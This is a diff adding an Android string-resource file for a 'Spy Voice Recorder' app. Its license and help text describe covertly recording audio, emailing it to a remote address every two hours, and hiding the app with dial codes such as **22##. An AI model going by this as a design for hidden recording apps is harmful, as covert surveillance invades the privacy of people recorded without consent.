@@ -1,0 +1,43 @@
+<resources>
+    <string name="app_name">Sting Operation</string>
+    <string name="firebase_login">SV Recorder</string>
+    <string name="login_with_google">Login with Google</string>
+    <string name="start_recording">Start Recording</string>
+    <string name="logout">Logout</string>
+    <string name="my_audio_clips">My Audio clips</string>
+    <string name="stop_record">STOP RECORDING</string>
+    <string name="hide_me">Hide Without Custom Recording</string>
+    <string name="hh">hh</string>
+    <string name="mm">mm</string>
+    <string name="ss">ss</string>
+    <string name="custom_recorder">Custom Recorder</string>
+    <string name="hide_me_with_custom_recorder">Hide with Custom Recorder</string>
+    <string name="hide_without_custom_recorder">hide without custom recorder</string>
+    <string name="recorderapplication">RecorderApplication</string>
+    <string name="licenseAgreement">
+        This Agreement shall deem to have come in to force at once, upon your using any of the services provided by Spy Voice Recorder.
+        The terms and conditions contained in this Agreement are NON-NEGOTIABLE and are subject to acceptance “AS IT IS”. If you do not agree to this Terms and Conditions, you shall quit using Spy Voice Recorder at ONCE.
+        Your use of the Services provided by Spy Voice Recorder, whether single use, multiple use or continuing use, shall deem to be considered as consideration, sufficiency of which is hereby acknowledged by you, to expressly agree to the terms and conditions contained in this Agreement.
+        Services provided herein are available only to those individuals/organizations that are competent to entire and form a legally binding and enforceable contract under applicable law.</string>
+
+    <string name="licenseAgreement2">Spy Voice Recorder is an Mobile application which is build with the following objectives : -</string>
+    <string name="licenseAgreement3">
+        1. Enabling Parents to monitor their minor child’s voice activities.\n
+        2. Provide parental control to their minor’s handset devices.\n
+        3. By Default Spy Voice Recorder have access to your microphone and file system which will be used to send recorded voice to remote email provided.</string>
+
+    <string name="licenseAgreement4">However we don\'t ensure fully access as beside this app may use mobile network,call logs, WiFi and other necessary requirements for proper functionality.\n</string>
+
+    <string name="licenseAgreement5">
+        You should be legally authorized to use this kind of spy apps in your country, region legally. Spy Voice Recorder is not responsible for any illegal use of this app. Use this at your
+own risk and terms.\n 
+All the recorder data/voice is only available to individuals/organizations who\'s email is registered as send voice recording to email section.\n
+However the privacy and Data security is applied properly but in any case, if the data is leaked, tampered or misused by any third party SV Recorder is not responsible for any such cases. Use this app at your own risk and every individuals/organizations isself responsible for using this app in any manner. Spy Voice Recorder or SV Recorder can be termed as same wherever used. SV Recorder can change or update the terms and conditions partially or completely.\n
+    </string>
+    <string name="information">
+        SV Recorder is an application that turns your device into Spy recording device that is capable of recording audio and uploads the recorded audio to remote email address.\n
+By default SV Recorder uploads audio after interval of 2 hours. You can customize it in settings along with remote email. We advise you to continuously save recorded audio sent to remote email as it may not be
+        available second time as we don\'t backup any audio files. Use **22## to hide the application and **11## to display the application again. Please make sure the device must have an active internet connection in order to upload the file continuously. In case if any issue please write feedback at Play Store.</string>
+
+
+</resources>
